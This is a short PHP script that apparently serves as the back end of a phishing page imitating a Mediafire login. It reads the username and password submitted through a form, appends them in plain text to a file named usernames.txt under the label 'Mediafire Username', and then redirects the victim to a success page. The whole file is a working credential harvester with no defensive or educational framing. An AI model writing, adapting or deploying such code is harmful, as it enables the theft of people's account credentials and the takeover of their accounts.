<?php

file_put_contents("usernames.txt", "Mediafire Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: success.html');
exit();
?>